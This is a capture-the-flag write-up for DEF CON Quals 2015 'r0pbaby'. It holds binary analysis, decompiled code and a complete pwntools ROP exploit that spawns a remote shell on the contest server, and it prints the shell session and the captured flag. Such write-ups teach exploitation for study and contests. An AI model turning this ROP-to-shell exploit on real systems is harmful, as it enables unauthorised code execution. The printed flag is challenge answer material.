# DEF CON CTF Quals 2015: r0pbaby

----------
## Challenge details
| Contest        | Challenge     | Category  | Points |
|:---------------|:--------------|:----------|-------:|
| DEF CON CTF Quals 2015 | r0pbaby | Baby's first |    1 |

**Description:**
>*[r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me:10436](challenge/r0pbaby)*

----------
## Write-up

This challenge is, as the name indicates, a pretty straightforward stack-smashing rop scenario. Let's take a look at the binary:

>```bash
>$file r0pbaby 
>r0pbaby: ELF 64-bit LSB  shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
>```

>```bash
>$ checksec
>CANARY    : disabled
>FORTIFY   : ENABLED
>NX        : ENABLED
>PIE       : ENABLED
>RELRO     : disabled
>```

When running it on our debian 64-bit VM we get the following:

>```bash
>$ ./r0pbaby
>./r0pbaby: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.14' not found (required by ../ropbaby/r0pbaby)
>```

This gives us an indication about the specific glibc version which will come in handy later. Let's run the app (this time on our Ubuntu 64-bit VM):

>```bash
>$ ./r0pbaby
>
>Welcome to an easy Return Oriented Programming challenge...
>Menu:
>1) Get libc address
>2) Get address of a libc function
>3) Nom nom r0p buffer to stack
>4) Exit
>: 1
>libc.so.6: 0x00007F6E2546D9B0
>1) Get libc address
>2) Get address of a libc function
>3) Nom nom r0p buffer to stack
>4) Exit
>: 2
>Enter symbol: system
>Symbol system: 0x00007F6E24CC9640
>1) Get libc address
>2) Get address of a libc function
>3) Nom nom r0p buffer to stack
>4) Exit
>: 3
>Enter bytes to send (max 1024): 3
>abc
>1) Get libc address
>2) Get address of a libc function
>3) Nom nom r0p buffer to stack
>4) Exit
>: Bad choice.
>```

Ok so the application already gives us the libc base address and the address of any function in libc. Technically, given an uknown libc version we could use the difference between function addresses to narrow down our search for the specific version but that won't be necessary in this case. Let's get some IDA pseudocode to see what the app does:

>```c
>__int64 mainroutine()
>{
>  signed int v0; // eax@4
>  unsigned __int64 buf_size; // r14@15
>  int v2; // er13@17
>  size_t index; // r12@17
>  int chr; // eax@18
>  void *handle; // [sp+8h] [bp-448h]@1
>  char user_input[1088]; // [sp+10h] [bp-440h]@2
>  __int64 savedregs; // [sp+450h] [bp+0h]@22
>
>  setvbuf(stdout, 0LL, 2, 0LL);
>  signal(14, handler);
>  alarm(0x3Cu);
>  puts("\nWelcome to an easy Return Oriented Programming challenge...");
>  puts("Menu:");
>  handle = dlopen("libc.so.6", 1);
>  while ( 1 )
>  {
>    while ( 1 )
>    {
>      while ( 1 )
>      {
>        while ( 1 )
>        {
>          disp_menu();
>          if ( !read_buffer((__int64)user_input, 1024LL) )
>          {
>            puts("Bad choice.");
>            return 0LL;
>          }
>          v0 = strtol(user_input, 0LL, 10);
>          if ( v0 != 2 )
>            break;
>          __printf_chk(1LL, "Enter symbol: ");
>          if ( read_buffer((__int64)user_input, 64LL) )
>          {
>            dlsym(handle, user_input);
>            __printf_chk(1LL, "Symbol %s: 0x%016llX\n");
>          }
>          else
>          {
>            puts("Bad symbol.");
>          }
>        }
>        if ( v0 > 2 )
>          break;
>        if ( v0 != 1 )
>          goto LABEL_24;
>        __printf_chk(1LL, "libc.so.6: 0x%016llX\n");
>      }
>      if ( v0 != 3 )
>        break;
>      __printf_chk(1LL, "Enter bytes to send (max 1024): ");
>      read_buffer((__int64)user_input, 1024LL);
>      buf_size = (signed int)strtol(user_input, 0LL, 10);
>      if ( buf_size - 1 > 0x3FF )
>      {
>        puts("Invalid amount.");
>      }
>      else
>      {
>        if ( buf_size )
>        {
>          v2 = 0;
>          index = 0LL;
>          while ( 1 )
>          {
>            chr = _IO_getc(stdin);
>            if ( chr == -1 )
>              break;
>            user_input[index] = chr;
>            ++v2;
>            index = v2;
>            if ( buf_size <= v2 )
>              goto LABEL_22;
>          }
>          index = v2 + 1;
>        }
>        else
>        {
>          index = 0LL;
>        }
>LABEL_22:
>        memcpy(&savedregs, user_input, index);
>      }
>    }
>    if ( v0 == 4 )
>      break;
>LABEL_24:
>    puts("Bad choice.");
>  }
>  dlclose(handle);
>  puts("Exiting.");
>  return 0LL;
>}
>```

The 'vulnerability' here isn't so much a vulnerability as a blatant transfer of RIP control:

>```c
>memcpy(&savedregs, user_input, index);
>```

savedregs is an IDA keyword indicating the saved stack frame pointer and function return address:

>```asm
>+0000000000000000  s              db 8 dup(?)
>+0000000000000008  r              db 8 dup(?)
>+0000000000000010
>+0000000000000010 ; end of stack variables
>```

So the first QWORD of our input overwrites the old RBP and the second QWORD overwrites the return address giving us RIP control. Since we're dealing with a NX + ASLR + PIE executable we'll have to build a (small) rop-chain consisting of:

1. A gadget that will put the address of the string "/bin/sh" in the RDI register
2. The address of the string "/bin/sh"
3. The address of the function system()

Giving us the rop-chain: <RBP overwrite>< RDI gadget addr ></bin/sh addr >< system addr >

Luckily all three can be found in libc. Instead of using [a tool](https://github.com/0vercl0k/rp) to find gadgets we relied on the fact that our local and the remote libc versions are identical and simply attached a debugger and searched memory for an offset from the given libc base address. A more robust approach would try to narrow down the specific libc version using function address difference and then dynamically resolve those addresses from the retrieved version.

1. We find a

>```asm
>pop rdi
>ret
>```

gadget at offset -0x7583e6 from our given libc base.

2. The string "/bin/sh" is present in libc:

>```bash
>$ strings r0pbaby_libc.so.6 | grep "/bin/sh"
>/bin/sh
>```

at offset -0x66dcd5 from our given libc base:

3. The address of system() is given to us by the application itself

Tying this together gives us the following exploit:

>```python
>#!/usr/bin/python
>#
># DEF CON CTF Quals 2015
># r0pbaby (BABYSFIRST/1)
>#
># @a: Smoke Leet Everyday
># @u: https://github.com/smokeleeteveryday
>#
>
>from pwn import *
>from struct import pack, unpack
>
>def get_libc_base(h):
>	h.send("1\n")
>	msg = h.recvuntil("4) Exit\n: ")
>	offset = msg.find(":")
>	offset2 = msg.find("\n")
>	base = msg[offset+2: offset2]	
>	return long(base, 16)
>
>def get_libc_func_addr(h, function):
>	h.send("2\n")
>	msg = h.recvuntil("Enter symbol: ")
>	h.send(function+"\n")
>	msg = h.recvuntil("4) Exit\n: ")
>	offset = msg.find(":")
>	offset2 = msg.find("\n")
>	addr = msg[offset+2: offset2]
>	return long(addr, 16)
>
>def nom_rop_buffer(h, rop_buffer):
>	h.send("3\n")
>	msg = h.recvuntil("Enter bytes to send (max 1024): ")
>	rop_buffer_len = str(len(rop_buffer))
>	h.send(rop_buffer_len + "\n")
>	h.send(rop_buffer + "\n")
>	msg = h.recvuntil("Bad choice.\n")	
>	return
>
>host = "r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me"
>port = 10436
>
>rdi_gadget_offset = 0x7583e6
>bin_sh_offset = 0x66dcd5
>
>h = remote(host, port)
>
>msg = h.recvuntil(": ")
>libc_base = get_libc_base(h)
>print "[+] libc base: [%x]" % libc_base
>
>rdi_gadget_addr = libc_base - rdi_gadget_offset
>print "[+] RDI gadget addr: [%x]" % rdi_gadget_addr
>
>bin_sh_addr = libc_base - bin_sh_offset
>print "[+] \"/bin/sh\" addr: [%x]" % bin_sh_addr
>
>system_addr = get_libc_func_addr(h, "system")
>
>print "[+] system addr: [%x]" % system_addr
>
>rbp_overwrite = "A"*8
>
>rop_buffer = rbp_overwrite + pack('<Q', rdi_gadget_addr) + pack('<Q', bin_sh_addr) + pack('<Q', system_addr)
>nom_rop_buffer(h, rop_buffer)
>
>h.interactive()
>
>h.close()
>```

Which gives us:

>```bash
>[+] Opening connection to r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me on port 10436: Done
>[+] libc base: [7f1a3ba349b0]
>[+] RDI gadget addr: [7f1a3b2dc5ca]
>[+] "/bin/sh" addr: [7f1a3b3c6cdb]
>[+] system addr: [7f1a3b290640]
>[*] Switching to interactive mode
>$ whoami
>r0pbaby
>$ ls -la /home/r0pbaby
>total 24
>drwxr-x--- 2 root r0pbaby  4096 May 15 16:05 .
>drwxr-xr-x 4 root root     4096 May 15 10:53 ..
>-rw-r--r-- 1 root r0pbaby    66 May 15 10:54 flag
>-rwxr-xr-x 1 root root    10240 May 15 16:05 r0pbaby
>$ cat /home/r0pbaby/flag
>The flag is: W3lcome TO THE BIG L3agu3s kiddo, wasn't your first?
>```